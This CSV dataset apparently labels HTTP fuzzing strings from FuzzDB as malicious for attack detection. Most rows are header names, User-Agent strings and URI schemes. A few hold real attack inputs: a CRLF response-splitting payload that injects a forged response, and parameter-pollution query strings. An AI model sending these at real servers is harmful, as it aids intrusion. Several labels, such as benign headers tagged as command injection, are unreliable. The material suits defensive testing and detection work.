UNSUBSCRIBE,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Upgrade,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/1.22 (compatible; MSIE 2.0d; Windows NT),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/2.0 (compatible; MSIE 3.02; Update a; Windows NT),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 4.01; Windows NT),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; (R1 1.6)),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.79 [en] (WinNT; U),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (PLAYSTATION 3; 1.00),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:0.9.2) Gecko/20010726 Netscape6/6.1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.19) Gecko/20081204 SeaMonkey/1.1.14,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10 (.NET CLR 3.5.30729) JBroFuzz/1.4,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.0.5) Gecko/2008120122 Firefox/3.0.5,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050923 CentOS/1.0.7-1.4.1.centos4 Firefox/1.0.7,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.7) Gecko/20070606,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; SunOS i86pc; en-US; rv:1.8.1.14) Gecko/20080520 Firefox/2.0.0.14,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Opera/9.27 (Windows NT 5.1; U; en),GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Wget/1.8.2,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
VERSION-CONTROL,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Vary,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Via,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
WWW-Authenticate,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Warning,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-ATT-DeviceId,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Security-Policy,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Content-Type-Options,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-For,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Host,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-Proto,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Frame-Options,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Http-Method-Override,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-MS-ENUMATTS,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Powered-By,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Requested-With,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-UA-Compatible,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Wap-Profile,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-WebKit-CSP,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-XSS-Protection,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
\\r\\n,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaa:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aaas:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
about:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
acap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
adiumxtra:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
afp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aim:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
apt:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aw:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
beshare:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bitcoin:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
bolo:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
callto:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
chrome:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cid:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
coap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
content:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
crid:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
cvs:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
data:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dav:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dict:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
dns:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
doi:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ed2k:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
facetime:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fax:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
feed:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
file:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
finger:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
fish:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ftp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
geo:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gg:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
git:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gizmoproject:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
go:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gopher:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
gtalk:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
h323:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
http:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
https:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iax:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
icap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
im:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
imap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
info:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ipp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc6:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
irc:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ircs:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.beep:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.lws:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpc:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris.xpcs:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
iris:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
itms:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
jar:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
javascript:,SCRIPT_TAG_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
keyparc:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lastfm:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldap:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ldaps:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
lsid:,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
magnet:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mailto:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
maps:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
market:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
message:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mid:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mms:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
modem:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msnim:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
msrps:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mtqp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mumble:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mupdate:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
mvn:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
news:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nfs:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
nntp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
notes:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
opaquelocktoken:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
palm:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
paparazzi:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
platform:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pop:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
pres:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
prospero:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
proxy:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
psyc:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
query:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a<html>Injected%02Content</html>,COMMAND_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rmi:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rsync:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtmp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
rtsp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
secondlife:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
service:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sftp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sgn:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
shttp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sieve:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sip:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sips:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
skype:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
smb:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
sms:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
snmp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beep:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soap.beeps:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
soldat:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
spotify:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ssh:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
steam:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
svn:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tag:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
teamspeak:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tel:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
telnet:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tftp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
things:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
thismessage:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tip:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
tv:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
udp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
unreal:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
urn:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ut2004:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
uuid:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
vemmi:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ventrilo:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
view-source:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wais:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
webcal:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ws:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wss:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wtai:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
wyciwyg:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xfire:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beeps:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmlrpc.beep :,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xmpp:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
xri:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
ymsgr:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50r:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
z39.50s:,GENERIC_INJECTION,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Content-MD5,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id=%23?id=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-Forwarded-For,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id&=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
urn:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
psyc:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
magnet:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
unreal:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; (R1 1.6)),HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
facetime:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20050923 CentOS/1.0.7-1.4.1.centos4 Firefox/1.0.7,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
?id[=/:@&=+$&id=2]=1,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-XSS-Protection,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
X-UA-Compatible,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
Refresh,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
acap:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
aim:,HTTP,HTTP Protocol Attack,Medium,T1190,Malicious,HTTP Protocol Attack payload from FuzzDB
